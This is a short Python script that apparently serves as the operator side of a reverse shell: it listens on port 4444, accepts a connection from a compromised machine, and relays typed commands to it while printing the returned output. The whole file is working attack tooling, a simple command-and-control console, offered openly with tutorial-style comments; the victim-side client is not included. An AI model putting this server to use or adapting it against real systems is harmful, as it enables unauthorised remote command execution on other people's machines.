import socket
import subprocess

HOST = "0.0.0.0"
PORT = 4444
SIZE = 1024
s = socket.socket()
# bind the socket to all IP addresses of this host
s.bind((HOST,PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"[*]Listening as {HOST}:{PORT} ...")
# accept any connections attempted
client_socket, client_address = s.accept()
print(f"[*]{client_address[0]}:{client_address[1]} Connected!")
# just sending a message, for demonstration purposes
message = "[*]Hello and Welcome".encode()
client_socket.send(message)
while True:
    # get the command from prompt
    command = input("[*]>")
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    results = client_socket.recv(SIZE).decode()
    # print them
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()
